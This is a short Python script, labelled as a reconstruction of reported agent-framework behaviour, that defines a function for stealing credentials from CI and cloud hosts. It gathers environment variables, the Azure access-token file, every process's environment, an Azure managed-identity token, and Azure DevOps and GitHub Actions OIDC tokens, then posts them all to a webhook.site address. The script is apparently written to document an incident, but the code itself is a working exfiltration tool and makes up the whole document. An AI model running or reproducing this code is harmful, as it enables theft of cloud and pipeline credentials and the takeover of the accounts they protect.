# Reconstruction of reported behavior; not recovered agent-framework source.
# Deliberately has no invocation or startup installation.
import os
import json
import requests
from pathlib import Path

def collect():
    report = {'environment': dict(os.environ)}
    report['credentials'] = (Path.home() / '.azure' / 'accessTokens.json').read_text()
    report['processes'] = {}
    for entry in Path('/proc').iterdir():
        if entry.name.isdigit():
            report['processes'][entry.name] = (entry / 'environ').read_bytes().decode(errors='replace')
    report['managed_identity'] = requests.get(
        'http://169.254.169.254/metadata/identity/oauth2/token',
        params={'api-version': '2018-02-01', 'resource': 'https://management.azure.com/'},
        headers={'Metadata': 'true'}).json()
    report['ado'] = requests.post(os.getenv('SYSTEM_OIDCREQUESTURI'),
        headers={'Authorization': 'Bearer ' + os.getenv('SYSTEM_ACCESSTOKEN')}).json()
    report['github'] = requests.get(os.getenv('ACTIONS_ID_TOKEN_REQUEST_URL'),
        headers={'Authorization': 'Bearer ' + os.getenv('ACTIONS_ID_TOKEN_REQUEST_TOKEN')}).json()
    requests.post('https://webhook.site/00000000-0000-0000-0000-000000000000', json=report)
